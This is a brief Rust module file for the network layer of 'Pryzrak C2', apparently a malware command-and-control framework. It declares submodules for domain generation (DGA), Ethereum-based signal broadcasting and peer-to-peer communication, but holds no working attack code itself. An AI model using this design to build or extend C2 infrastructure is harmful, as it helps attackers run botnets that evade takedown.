//! Network module for Pryzrak C2

pub mod dga;
pub mod eth_broadcaster;
pub mod p2p;

pub use dga::{generate_domain, resolve_peers};
pub use eth_broadcaster::broadcast_signal;
pub use p2p::P2PService;
